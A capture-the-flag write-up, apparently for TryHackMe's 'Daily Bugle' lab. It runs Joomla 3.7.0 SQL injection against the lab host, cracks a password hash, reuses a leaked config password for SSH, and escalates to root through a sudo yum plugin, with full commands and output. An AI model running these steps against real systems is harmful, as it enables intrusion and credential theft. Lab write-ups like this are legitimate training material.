DAILY_BUGLE


ENUMERATION 

"""

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/DAILY_BUGLE]
└─$ sudo nmap -sS -sV 10.10.89.40  -oN nmap.txt
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-25 00:39 EST
Nmap scan report for 10.10.89.40
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.40 seconds
                                                                                

"""

LETS RUN DIRECTORY SCAN ON THE DOMAIN 


ALOT OF INTRESTING DOMAINS HERE

"""

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/DAILY_BUGLE]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.89.40/        
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.89.40/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/25 00:45:13 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 211]
/.hta                 (Status: 403) [Size: 206]
/.htpasswd            (Status: 403) [Size: 211]
/administrator        (Status: 301) [Size: 241] [--> http://10.10.89.40/administrator/]
/bin                  (Status: 301) [Size: 231] [--> http://10.10.89.40/bin/]          
/cache                (Status: 301) [Size: 233] [--> http://10.10.89.40/cache/]        
/cgi-bin/             (Status: 403) [Size: 210]                                        
/components           (Status: 301) [Size: 238] [--> http://10.10.89.40/components/]   
/images               (Status: 301) [Size: 234] [--> http://10.10.89.40/images/]       
/includes             (Status: 301) [Size: 236] [--> http://10.10.89.40/includes/]     
/index.php            (Status: 200) [Size: 9276]                                       
/language             (Status: 301) [Size: 236] [--> http://10.10.89.40/language/]     
/layouts              (Status: 301) [Size: 235] [--> http://10.10.89.40/layouts/]      
/libraries            (Status: 301) [Size: 237] [--> http://10.10.89.40/libraries/]    
/media                (Status: 301) [Size: 233] [--> http://10.10.89.40/media/]        
/modules              (Status: 301) [Size: 235] [--> http://10.10.89.40/modules/]      
/plugins              (Status: 301) [Size: 235] [--> http://10.10.89.40/plugins/]      
/robots.txt           (Status: 200) [Size: 836]                                        
/templates            (Status: 301) [Size: 237] [--> http://10.10.89.40/templates/]    
/tmp                  (Status: 301) [Size: 231] [--> http://10.10.89.40/tmp/]          
                                                                                       
===============================================================
2022/02/25 00:46:35 Finished
===============================================================

LETS DO A DIRECTORY SCAN ON /ADMINISTRATOR


┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/DAILY_BUGLE]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.89.40/administrator/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.89.40/administrator/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/25 01:00:41 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 220]
/.htaccess            (Status: 403) [Size: 225]
/.htpasswd            (Status: 403) [Size: 225]
/cache                (Status: 301) [Size: 247] [--> http://10.10.89.40/administrator/cache/]
/components           (Status: 301) [Size: 252] [--> http://10.10.89.40/administrator/components/]
/help                 (Status: 301) [Size: 246] [--> http://10.10.89.40/administrator/help/]      
/includes             (Status: 301) [Size: 250] [--> http://10.10.89.40/administrator/includes/]  
/index.php            (Status: 200) [Size: 4840]                                                  
/language             (Status: 301) [Size: 250] [--> http://10.10.89.40/administrator/language/]  
/logs                 (Status: 301) [Size: 246] [--> http://10.10.89.40/administrator/logs/]      
/modules              (Status: 301) [Size: 249] [--> http://10.10.89.40/administrator/modules/]   
/templates            (Status: 301) [Size: 251] [--> http://10.10.89.40/administrator/templates/] 
                                                                                                  
===============================================================
2022/02/25 01:02:07 Finished
===============================================================


"""

FOUND JOOMLA VERSION DETAILS AND ADMIN EMAIL  ---> http://10.10.89.40/administrator/modules/mod_version/mod_version.xml

"""


<license>
GNU General Public License version 2 or later; see LICENSE.txt
</license>
<authorEmail>admin@joomla.org</authorEmail>
<authorUrl>www.joomla.org</authorUrl>
<version>3.0.0</version>
NOT CORRECT VERSION



"""


LETS USE METASPLOIT SCANNER 


"""

msf6 auxiliary(scanner/http/joomla_version) > show options

Module options (auxiliary/scanner/http/joomla_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the Joomla application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host

msf6 auxiliary(scanner/http/joomla_version) > set Rhost 10.10.89.40
Rhost => 10.10.89.40
msf6 auxiliary(scanner/http/joomla_version) > show options

Module options (auxiliary/scanner/http/joomla_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.89.40      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the Joomla application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host

msf6 auxiliary(scanner/http/joomla_version) > run

[*] Server: Apache/2.4.6 (CentOS) PHP/5.6.40
[+] Joomla version: 3.7.0
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/joomla_version) > 


"""

[+] Joomla version: 3.7.0


LETS DO A SEARCHSPLOIT 


"""
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/DAILY_BUGLE]
└─$ searchsploit joomla 3.7.0                                                 
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                                           | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                                                        | php/webapps/43488.txt
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


"""

WE GOT A HINT TO NOT USE SQLMAP 
AND USE A PYTHON SCRIPT QUICK SEARCH WILL BRING THE PYTHON DEVELOPED EXPLOTS 


"""

https://github.com/SiopySh/CVE-2017-8917.git

"""


LETS CLONE it AND try it 


"""
                                                                                                                                                                       
┌──(kali㉿kali)-[~/…/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/DAILY_BUGLE/CVE-2017-8917]
└─$ python cve20178917.py
     _                           _           ____ __     __ _____ 
    | |  ___    ___   _ __ ___  | |  __ _   / ___|\ \   / /| ____|
 _  | | / _ \  / _ \ | '_ ` _ \ | | / _` | | |     \ \ / / |  _|  
| |_| || (_) || (_) || | | | | || || (_| | | |___   \ V /  | |___ 
 \___/  \___/  \___/ |_| |_| |_||_| \__,_|  \____|   \_/   |_____|
                                                                  

--- Version : Joomla 3.7.0 ---
--- Date : 05/27/2021 ---
--- CVE : CVE-2017-8917 ---
--- Exploit Author : SiopySh <contact@siopysh.com> - Twitter @siopysh ---
 
URL (ex: http://10.10.10.10/) : http://10.10.89.40/
 
* Database prefix : fb9j5
* Joomla user : jonah
* Joomla user mail : jonah@tryhackme.com
* Joomla user password : $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
* Database user : root@localhost
* Database name : joomla
* Database version : 5.5.64-MariaDB


"""


LETS CRACK THE HASHAES


AFTER 20 mins 


"""
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/DAILY_BUGLE]
└─$ john  --wordlist=/usr/share/wordlists/rockyou.txt jonah.txt    
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:08 0.00% (ETA: 2022-03-01 02:26) 0g/s 47.36p/s 47.36c/s 47.36C/s simple..88888888
0g 0:00:04:21 0.05% (ETA: 2022-03-03 07:59) 0g/s 32.29p/s 32.29c/s 32.29C/s bigred1..sander
0g 0:00:07:50 0.09% (ETA: 2022-03-02 21:21) 0g/s 34.54p/s 34.54c/s 34.54C/s HERMOSA..091188
0g 0:00:14:44 0.18% (ETA: 2022-03-02 15:26) 0g/s 36.21p/s 36.21c/s 36.21C/s montie..matthew14
0g 0:00:19:52 0.25% (ETA: 2022-03-02 13:19) 0g/s 36.80p/s 36.80c/s 36.80C/s loco123..lala16
spiderman123     (?)     
1g 0:00:21:44 DONE (2022-02-25 02:57) 0.000766g/s 35.90p/s 35.90c/s 35.90C/s sweetsmile..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                   

"""


USER NAME jonah
password spiderman123


LETS LOG IN WEB and ssh loooks like ssh password is different


LOGIN TROUGH CHANGING INDEX.php of the beeze template by puting the shell code instead

coudnot get in home/jjames
RUN LINPEAS

FIND A PUBLIC PASSWORD


"""
╔══════════╣ Searching passwords in config PHP files
        public $password = 'nv5uz9r3ZEDzVjNu';                                                                                                                         
                        $this->password = (empty($this->options['db_pass'])) ? '' : $this->options['db_pass'];
                        $this->password = null;
                        'password' => $this->password,


"""

LETS TRY LOGIN SSH WITH 

USER NAME =jjameson
PASSWORD = nv5uz9r3ZEDzVjNu

BINGO LOGED IN:

"""
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/DAILY_BUGLE]
└─$ ssh jjameson@10.10.89.40        
jjameson@10.10.89.40's password: 
Last login: Mon Dec 16 05:14:55 2019 from netwars
[jjameson@dailybugle ~]$ 
[jjameson@dailybugle ~]$ ls
user.txt
[jjameson@dailybugle ~]$ pwd
/home/jjameson
[jjameson@dailybugle ~]$ cat user.txt
27a260fe3cba712cfdedb1c86d80442e
[jjameson@dailybugle ~]$ 



"""
PRIVESC
"""

══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                            
Matching Defaults entries for jjameson on dailybugle:                                                                                                                  
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum


"""
GO TO GTFOBINS 


FOUND 


"""
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y



"""

FOLLOW THESE STEPS


"""

[jjameson@dailybugle ~]$ TF=$(mktemp -d)
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF

[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.2# cd ..
sh-4.2# cd /root
sh-4.2# ls
anaconda-ks.cfg  root.txt
sh-4.2# cat root.txt
eec3d53292b1821868266858d7fa6f79
sh-4.2# 


"""



